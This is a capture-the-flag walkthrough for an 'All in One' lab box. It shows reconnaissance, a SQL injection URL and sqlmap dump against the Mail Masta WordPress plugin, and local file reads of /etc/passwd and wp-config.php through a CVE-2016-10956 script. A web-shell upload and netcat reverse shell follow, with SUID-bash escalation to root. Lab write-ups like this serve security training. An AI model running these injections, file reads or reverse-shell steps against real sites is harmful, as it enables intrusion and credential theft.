# All in One
## Difficulty: Easy
This is a fun box where you will get to exploit the system in several ways. Few intended and unintended paths to getting user and root access.

### Task 
This box's intention is to help you practice several ways in exploiting a system. There is few intended paths to exploit it and few unintended paths to get root.

Try to discover and exploit them all. Do not just exploit it using intended paths, hack like a pro and enjoy the box !

Give the machine about 5 mins to fully boot.

Twitter: i7m4d

## Information Gathering
```bash
nmap -sC -sV 10.201.7.83 -oN nmap_allinone

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 07:54 WIB
Nmap scan report for 10.201.7.83
Host is up (0.31s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.1.226
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3e:65:f3:f2:79:35:7b:59:ea:dc:04:e9:3a:1c:23:1e (RSA)
|   256 b9:52:01:7a:f3:e3:21:6a:36:c7:1d:b7:49:b9:80:ca (ECDSA)
|_  256 42:b2:f3:a2:e6:16:81:27:22:d4:ba:06:63:27:a7:6d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.34 seconds
```
```bash
ftp  10.201.7.83

Connected to 10.201.7.83.
220 (vsFTPd 3.0.5)
Name (10.201.7.83:santstyle): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||23980|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
ftp> 
```
```bash
gobuster dir -u http://10.201.7.83/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.7.83/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/.htm                 (Status: 403) [Size: 276]
/.                    (Status: 200) [Size: 10918]
/wordpress            (Status: 301) [Size: 314] [--> http://10.201.7.83/wordpress/]
/.htaccess            (Status: 403) [Size: 276]
/.phtml               (Status: 403) [Size: 276]
/.htc                 (Status: 403) [Size: 276]
/.html_var_de         (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.html.               (Status: 403) [Size: 276]
/.html.html           (Status: 403) [Size: 276]
/.htpasswds           (Status: 403) [Size: 276]
/.htm.                (Status: 403) [Size: 276]
/.htmll               (Status: 403) [Size: 276]
/.phps                (Status: 403) [Size: 276]
/.html.old            (Status: 403) [Size: 276]
/.html.bak            (Status: 403) [Size: 276]
/.ht                  (Status: 403) [Size: 276]
/.htm.htm             (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htgroup             (Status: 403) [Size: 276]
/.html1               (Status: 403) [Size: 276]
```

+ in the wordpress directory found the mail-masta and reflex-galery plugins


## Exploit
### SQL Injection Exploitation (Mail Masta Plugin)
```bash
http://10.201.7.83/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php
```

Damp database wordpress using SQLMap
```bash
sqlmap -u " http://10.201.7.83/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -p list_id --batch --dump 
```
#### Output summary:
```bash
[INFO] testing connection to the target URL
[INFO] target URL content is stable
[INFO] testing for SQL injection on GET parameter 'list_id'
[INFO] GET parameter 'list_id' appears to be 'MySQL time-based blind' injectable
[INFO] GET parameter 'list_id' appears to be 'MySQL UNION query' injectable
...
[INFO] fetching tables for database: 'wordpress'
Database: wordpress
[20 tables]
+-----------------------+
| wp_users              |
| wp_posts              |
| wp_options            |
| ...                   |
+-----------------------+

[INFO] fetching columns for table 'wp_users'
[INFO] fetching entries for table 'wp_users'
Database: wordpress
Table: wp_users
+----+---------+---------------------------------------------+
| ID |  login  | user_pass                                   |
+----+---------+---------------------------------------------+
|  1 | elyana  | $P$BhwVLVLk5fGRPyoEfmBfVs82bY7fSq1          |
+----+---------+---------------------------------------------+

[INFO] fetched data logged to text files under:
~/.local/share/sqlmap/output/10.201.7.83/
```


git clone `https://github.com/p0dalirius/CVE-2016-10956-mail-masta/blob/master/CVE-2016-10956_mail_masta.py`

and using
```bash
python CVE-2016-10956_mail_masta.py -t http://10.201.127.46/wordpress/ -f /etc/passwd
[+] Mail Masta - Local File Read (CVE-2016-10956)

[+] (  2.02 kB) /etc/passwd
```

Return
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash
mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
systemd-timesync:x:113:116:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
tss:x:114:119:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:115:120::/nonexistent:/usr/sbin/nologin
usbmux:x:116:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fwupd-refresh:x:117:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash``` 
```

```bash
python CVE-2016-10956_mail_masta.py -t http://10.201.127.46/wordpress/ -f /var/www/html/wordpress/wp-config.php

[+] Mail Masta - Local File Read (CVE-2016-10956)

[+] (  3.27 kB) /var/www/html/wordpress/wp-config.php
```

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** MySQL database username */
define( 'DB_USER', 'elyana' );
/** MySQL database password */
define( 'DB_PASSWORD', 'H@ckme@123' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
wordpress;
define( 'WP_SITEURL', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');
define( 'WP_HOME', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');
```
+ Log in to http://10.201.127.46/wordpress/wp-login.php using the credentials above.
+ and use shell.php submit it in the plugin uploads section on the website page
```bash
nc -lnvp 9001
listening on [any] 9001 ...
```
+ and check in new tab http://10.201.127.46/wordpress/wp-content/uploads/2025/09/ press `shell.php`
```bash
nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.9.1.226] from (UNKNOWN) [10.201.127.46] 34258
Linux ip-10-201-127-46 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 08:50:20 up 40 min,  0 users,  load average: 0.08, 0.03, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
```bash
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ip-10-201-127-46:/$ ^Z
```
```bash
 stty raw -echo;fg
[1]  + continued  nc -lnvp 9001
                               export TERM=xterm
www-data@ip-10-201-127-46:/$ ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var
```
```bash
www-data@ip-10-201-127-46:/home$ ls -la

total 16
drwxr-xr-x  4 root   root   4096 Sep 14 08:09 .
drwxr-xr-x 24 root   root   4096 Sep 14 08:09 ..
drwxr-xr-x  6 elyana elyana 4096 Oct  7  2020 elyana
drwxr-xr-x  3 ubuntu ubuntu 4096 Sep 14 08:09 ubuntu
```
```bash
www-data@ip-10-201-127-46:/home/elyana$ ls -la
total 48
drwxr-xr-x 6 elyana elyana 4096 Oct  7  2020 .
drwxr-xr-x 4 root   root   4096 Sep 14 08:09 ..
-rw------- 1 elyana elyana 1632 Oct  7  2020 .bash_history
-rw-r--r-- 1 elyana elyana  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elyana elyana 3771 Apr  4  2018 .bashrc
drwx------ 2 elyana elyana 4096 Oct  5  2020 .cache
drwxr-x--- 3 root   root   4096 Oct  5  2020 .config
drwx------ 3 elyana elyana 4096 Oct  5  2020 .gnupg
drwxrwxr-x 3 elyana elyana 4096 Oct  5  2020 .local
-rw-r--r-- 1 elyana elyana  807 Apr  4  2018 .profile
-rw-r--r-- 1 elyana elyana    0 Oct  5  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 elyana elyana   59 Oct  6  2020 hint.txt
-rw------- 1 elyana elyana   61 Oct  6  2020 user.txt
www-data@ip-10-201-127-46:/home/elyana$ cat user.txt
cat: user.txt: Permission denied
www-data@ip-10-201-127-46:/home/elyana$ cat hint.txt
Elyana's user password is hidden in the system. Find it ;)
```

`www-data@ip-10-201-127-46:/home/elyana$ vim /var/backups/script.sh`
```bash
#!/bin/bash
chmod +s /bin/bash
#Just a test script, might use it later to for a cron task
```
After that `ls -la /bin/bash`
and ` /bin/bash -p`
```bash
www-data@ip-10-201-127-46:/home/elyana$ ls -la /bin/bash

-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
www-data@ip-10-201-127-46:/home/elyana$ /bin/bash -p
bash-5.0# 
```
```bash
bash-5.0# cd /root
bash-5.0# ls -la
total 60
drwx------  6 root root 4096 May 11 14:26 .
drwxr-xr-x 24 root root 4096 Sep 14 08:09 ..
-rw-------  1 root root 1197 May 11 14:30 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 May 11 14:26 .cache
drwxr-xr-x  3 root root 4096 Oct  5  2020 .local
-rw-------  1 root root  293 Oct  5  2020 .mysql_history
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
drwx------  2 root root 4096 Oct  6  2020 .ssh
-rw-------  1 root root 8367 Oct  6  2020 .viminfo
-rw-r--r--  1 root root  163 Oct  5  2020 .wget-hsts
-rw-r--r--  1 root root   61 Oct  6  2020 root.txt
drwx------  3 root root 4096 Apr 27 10:55 snap
bash-5.0# 
```
```bash
bash-5.0# cd /home/elyana
bash-5.0# ls -la
total 48
drwxr-xr-x 6 elyana elyana 4096 Oct  7  2020 .
drwxr-xr-x 4 root   root   4096 Sep 14 08:09 ..
-rw------- 1 elyana elyana 1632 Oct  7  2020 .bash_history
-rw-r--r-- 1 elyana elyana  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elyana elyana 3771 Apr  4  2018 .bashrc
drwx------ 2 elyana elyana 4096 Oct  5  2020 .cache
drwxr-x--- 3 root   root   4096 Oct  5  2020 .config
drwx------ 3 elyana elyana 4096 Oct  5  2020 .gnupg
drwxrwxr-x 3 elyana elyana 4096 Oct  5  2020 .local
-rw-r--r-- 1 elyana elyana  807 Apr  4  2018 .profile
-rw-r--r-- 1 elyana elyana    0 Oct  5  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 elyana elyana   59 Oct  6  2020 hint.txt
-rw------- 1 elyana elyana   61 Oct  6  2020 user.txt
bash-5.0# cat user.txt
******************************************
```
Using `base64 -d` like  this
```bash
echo '******************************************' | base64 -d
THM{******************************************}
```
`Yeyy user.txt take it`
```bash
bash-5.0# cd /root
bash-5.0# ls -la
total 60
drwx------  6 root root 4096 May 11 14:26 .
drwxr-xr-x 24 root root 4096 Sep 14 08:09 ..
-rw-------  1 root root 1197 May 11 14:30 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 May 11 14:26 .cache
drwxr-xr-x  3 root root 4096 Oct  5  2020 .local
-rw-------  1 root root  293 Oct  5  2020 .mysql_history
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
drwx------  2 root root 4096 Oct  6  2020 .ssh
-rw-------  1 root root 8367 Oct  6  2020 .viminfo
-rw-r--r--  1 root root  163 Oct  5  2020 .wget-hsts
-rw-r--r--  1 root root   61 Oct  6  2020 root.txt
drwx------  3 root root 4096 Apr 27 10:55 snap

bash-5.0# cat root.txt
******************************************
```
Using `base64 -d` like this
```bash
echo '******************************************' | base64 -d
THM{******************************************}
```
`Finally root.txt take it`
